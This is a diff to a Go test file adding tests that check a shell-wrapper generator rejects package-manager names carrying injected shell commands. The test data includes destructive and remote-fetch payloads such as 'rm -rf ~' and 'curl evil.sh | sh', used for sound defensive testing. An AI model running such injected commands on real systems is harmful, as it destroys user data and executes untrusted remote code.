@@ -44,6 +44,52 @@ func TestGenerateWrapper_MultiplePMs(t *testing.T) {
 	}
 }
 
+// TestGenerateWrapper_RejectsUnsafeNames verifies that package-manager names
+// containing shell metacharacters are dropped before being interpolated into
+// the generated RC script, so a malformed or attacker-influenced name can never
+// inject commands into a sourced shell startup file (CWE-78).
+func TestGenerateWrapper_RejectsUnsafeNames(t *testing.T) {
+	malicious := []string{
+		"npm; rm -rf ~",
+		"npm`id`",
+		"npm$(whoami)",
+		"npm && curl evil.sh | sh",
+		"npm\nrm -rf /",
+		"NPM",       // uppercase not allowed by the identifier rule
+		"-npm",      // must start with a letter
+		"np m",      // whitespace
+		"npm'quote", // embedded quote
+	}
+
+	for _, shell := range []string{"bash", "zsh", "fish"} {
+		for _, name := range malicious {
+			wrapper := GenerateWrapper(shell, []string{name})
+			// The only content should be the marker block; the unsafe name must
+			// not appear anywhere in the generated script.
+			if strings.Contains(wrapper, name) {
+				t.Errorf("%s wrapper leaked unsafe PM name %q:\n%s", shell, name, wrapper)
+			}
+		}
+	}
+}
+
+// TestGenerateWrapper_KeepsValidAlongsideInvalid ensures sanitization is
+// per-entry: a valid PM name is still wrapped even when an unsafe one is present
+// in the same list.
+func TestGenerateWrapper_KeepsValidAlongsideInvalid(t *testing.T) {
+	wrapper := GenerateWrapper("bash", []string{"npm", "evil; rm -rf ~", "pnpm"})
+
+	if !strings.Contains(wrapper, "npm()") {
+		t.Error("valid npm wrapper should be present")
+	}
+	if !strings.Contains(wrapper, "pnpm()") {
+		t.Error("valid pnpm wrapper should be present")
+	}
+	if strings.Contains(wrapper, "rm -rf") {
+		t.Errorf("unsafe entry leaked into wrapper:\n%s", wrapper)
+	}
+}
+
 func TestInjectAndRemoveFunctions(t *testing.T) {
 	tmpDir := t.TempDir()
 	rcFile := filepath.Join(tmpDir, ".bashrc")
